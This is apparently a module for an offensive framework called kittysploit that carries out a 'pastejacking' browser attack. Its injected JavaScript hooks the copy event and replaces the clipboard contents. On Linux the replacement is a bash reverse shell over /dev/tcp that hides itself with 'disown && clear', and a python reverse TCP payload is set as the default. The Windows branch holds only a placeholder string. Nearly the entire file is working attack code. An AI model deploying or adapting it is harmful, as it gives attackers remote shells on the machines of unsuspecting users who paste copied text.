from kittysploit import *

class Module(BrowserExploit):

	__info__ = {
		"name": "pastejacking",
		"description": "Clipboard and change content on browser victim",
		"payload": {
            "default": "payloads/singles/cmd/unix/python_reverse_tcp",
            "platform": Platform.GENERIC,
            "arch": Arch.GENERIC
			}
	}	
	
#	payload = OptString("", "")

	def run(self):
#		shell = self.payload.generate()
		js = "document.addEventListener('copy', function(e){\n"
		js += "var toto = navigator.platform;\n"
		js += "if (toto.indexOf('Linux') == 0)\n"
		js += "{ var payload = 'exec 5<>/dev/tcp/127.0.0.1/3000;cat <&5 | while read line; do $line 2>&5 >&5; done & disown && clear;\\r\\n';\n"
		js += "}\n"
		js += "else\n"
		js += "{ var payload = 'payload_win';\n"
		js += "}\n"		 
		js += "console.log(payload);\n"
		js += "e.clipboardData.setData('text/plain', payload);\n"
		js += "e.preventDefault();\n"
		js += "});\n"
		self.send_js(js)
